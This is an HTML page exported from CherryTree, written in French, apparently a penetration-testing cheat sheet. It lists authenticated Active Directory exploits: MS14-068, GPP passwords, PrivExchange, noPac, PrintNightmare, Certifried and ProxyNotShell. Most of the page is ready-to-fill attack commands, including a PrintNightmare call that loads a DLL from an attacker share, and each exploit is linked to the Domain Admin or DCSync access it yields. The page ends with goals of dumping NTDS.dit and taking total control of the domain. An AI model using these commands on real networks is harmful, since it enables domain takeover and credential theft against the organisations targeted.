<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>07- Authenticated exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>07- Authenticated exploits</h1><br/><p><ol><li><h2>MS14-068 (Kerberos checksum)</h2></li><li>VÃ©rif. vuln. : <code>findSMB2UPTime.py &lt;ip&gt;</code></li></ol></p><p><ul><li>Exploit :</p><p></li></ul><div class="codebox"><pre>ms14-068.py -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span> -dc-ip <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br />msf <span style="color:#ff9d00;font-weight:700">&gt;</span> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum<br />goldenPac.py -dc-ip <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span>/<span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>:<span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>target<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div><code></code></p><p><code></code><ul><li>âžœ <em>PTT</em> â†’ <strong>Domain Admin</strong> ðŸ”´ / <strong>Admin</strong> ðŸ©·</li></ul></p><p></p><p></p><p><ol><li>2. <h2>2. GPP MS14-025 (mots de passe XML sur SYSVOL)</h2></p><p></li></ol><div class="codebox"><pre>smb: <span style="color:#333333;font-weight:400">\\</span><span style="color:#ff9d00;font-weight:700">&lt;</span>DC<span style="color:#ff9d00;font-weight:700">&gt;</span><span style="color:#333333;font-weight:400">\S</span>YSVOL<span style="color:#333333;font-weight:400">\&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span><span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\*</span>.xml<br /><br />Get-GPPPassword -gpppassword @<span style="color:#ff9d00;font-weight:700">&lt;</span>dc_fqdn<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p></p><p>âžœ Creds en clair â‡’ <strong>Domain Admin</strong> ðŸ”´</p><p></p><p></p><p><ol><li>3. <h2>3. PrivExchange (CVE-2019-0724 / 0686)</h2></p><p></li></ol><div class="codebox"><pre>privexchange.py -ah <span style="color:#ff9d00;font-weight:700">&lt;</span>attacker_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>exchange_host<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p></p><p>Utilise <em>HTTP Coerce</em> ðŸŸ¡ (NTLM vers AD CS)</p><p></p><p>âžœ <strong>Domain Admin</strong> ðŸ”´ / <strong>Admin</strong> ðŸ©·</p><p></p><p></p><p><ol><li>4. <h2>4. noPac (CVE-2021-42287 &amp; 42278)</h2></p><p></li></ol><div class="codebox"><pre>nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#3ad900;font-weight:400">&quot;&lt;user&gt;&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;&lt;pass&gt;&quot;</span> -M nopac <span style="color:#0088ff;font-weight:400">#scan</span><br />noPac.exe -domain <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -user <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -pass <span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\</span><br />          -dc <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_fqdn<span style="color:#ff9d00;font-weight:700">&gt;</span> -mAccount <span style="color:#ff9d00;font-weight:700">&lt;</span>machine_account<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\<br /></span>          -mPassword <span style="color:#ff9d00;font-weight:700">&lt;</span>machine_password<span style="color:#ff9d00;font-weight:700">&gt;</span> -service cifs/<span style="color:#ff9d00;font-weight:700">&lt;</span>ptt<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div><code></code></p><p><code></code>âžœ <em>PTT</em> âžœ <strong>DCSYNC</strong> ðŸŸ¦ âžœ <strong>Domain Admin</strong> ðŸ”´</p><p></p><p></p><p><ol><li>5. <h2>5. PrintNightmare (CVE-2021-1675 / 34527)</h2></p><p></li></ol><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#Scan : </span><br />nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#3ad900;font-weight:400">&quot;&lt;user&gt;&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;&lt;pass&gt;&quot;</span> -M printnightmare<br /><br /><span style="color:#0088ff;font-weight:400">#Exploit :</span><br /> printnightmare.py -dll <span style="color:#333333;font-weight:400">\\</span>attacker_ip<span style="color:#333333;font-weight:400">\m</span>b<span style="color:#333333;font-weight:400">\a</span>dd_user.dll <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>:<span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p></p><p>âžœ <strong>Admin</strong> ðŸ©·</p><p></p><p></p><p><ol><li>6. <h2>6. Certifried (CVE-2022-26923 â€” AD CS)</h2></p><p></li></ol><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># 1. CrÃ©er un compte si besoin</span><br />certipy account create -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>password<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\<br /></span>                       -user <span style="color:#3ad900;font-weight:400">&quot;certified$&quot;</span> -pass <span style="color:#3ad900;font-weight:400">&quot;certifiedpass&quot;</span> -dns <span style="color:#ff9d00;font-weight:700">&lt;</span>fqdn_dc<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br /><span style="color:#0088ff;font-weight:400"># 2. RequÃªter un cert malveillant</span><br />certipy req -u <span style="color:#3ad900;font-weight:400">&quot;certified$@&lt;domain&gt;&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;certifiedpass&quot;</span> <span style="color:#333333;font-weight:400">\<br /></span>            -target <span style="color:#ff9d00;font-weight:700">&lt;</span>ca_fqdn<span style="color:#ff9d00;font-weight:700">&gt;</span> -ca <span style="color:#ff9d00;font-weight:700">&lt;</span>name<span style="color:#ff9d00;font-weight:700">&gt;</span> -template Machine<br /><br /><span style="color:#0088ff;font-weight:400"># 3. Auth avec le .pfx</span><br />certipy auth -pfx <span style="color:#ff9d00;font-weight:700">&lt;</span>pfx_file<span style="color:#ff9d00;font-weight:700">&gt;</span> -username <span style="color:#3ad900;font-weight:400">&quot;dc$&quot;</span></pre></div><code></code></p><p><code></code>âžœ <em>PTT</em> â†’ <strong>DCSYNC</strong> ðŸŸ¦ â†’ <strong>Domain Admin</strong> ðŸ”´</p><p></p><p></p><p><ol><li>7. <h2>7. ProxyNotShell (CVE-2022-41040 / 41082 â€” Exchange)</h2></li></ol></p><p><code>prox_autP3.py &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;</code></p><p></p><p>âžœ <strong>Admin</strong> ðŸ©·</p><p></p><p></p><p><h2>Livrables de la phase 7</h2></p><p>Tickets Kerberos (PTT) / certificats / hash NTLM dominants.</p><p></p><p>Chemins rapides vers <strong>Domain Admin</strong> via MS14-068, GPP, noPac, Certifried.</p><p></p><p>AccÃ¨s <strong>Admin</strong> supplÃ©mentaires (PrintNightmare, ProxyNotShell, PrivExchange).</p><p></p><p>Base idÃ©ale pour <strong>DCSYNC</strong>/NTDS.dit dump et contrÃ´le total du domaine.</p><p></p><p></p></div>
</body>
</html>
